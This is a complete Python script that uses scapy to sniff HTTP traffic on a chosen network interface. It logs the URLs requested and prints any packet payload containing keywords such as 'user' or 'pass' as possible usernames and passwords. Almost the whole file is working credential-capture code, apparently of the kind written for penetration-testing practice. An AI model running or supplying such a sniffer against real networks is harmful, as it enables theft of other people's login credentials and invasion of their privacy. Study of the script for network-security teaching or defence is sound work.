#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
from colorama import Fore, init
from datetime import datetime
import subprocess
import argparse

init(autoreset=True)


def get_list_interfaces():
    list_interfaces = []
    output = subprocess.check_output("ifconfig")
    list_ifconfig = output.decode().split("\n")
    for i in list_ifconfig:
        if len(i.split(": flags=")) > 1:
            item_interface = i.split(": flags=")[0].strip()
            list_interfaces.append(item_interface)
    return list_interfaces


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Enter the interface name, for example: eth0")
    options = parser.parse_args()
    list_interfaces = get_list_interfaces()

    if not options.interface:
        parser.error(Fore.RED + "[+]" + Fore.GREEN + " Please specify network interface, use --help for more info")
    if options.interface not in list_interfaces:
        parser.error(Fore.RED + "[+]" + Fore.GREEN + f" Please specify correct network interface, from the following: "
                                                     f"{', '.join(list_interfaces)}")
    return options.interface


def sniff(name_interface):
    scapy.sniff(iface=name_interface, store=False, prn=packet_analysis)


def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    keywords = ['user', 'username', 'name', 'password', 'pass']
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        for keyword in keywords:
            if keyword in load:
                return load


def get_time_now():
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
    print(Fore.GREEN + time, end='')


def packet_analysis(packet):
    if packet.haslayer(http.HTTPRequest):
        url = geturl(packet)
        get_time_now()
        print(f"[+] HTTP Request >> {url.decode()}")
        login_info = get_login_info(packet)
        if login_info:
            get_time_now()
            print(Fore.YELLOW + f"[+] Possible username/password {login_info}")


if __name__ == "__main__":
    interface = get_arguments()
    sniff(interface)
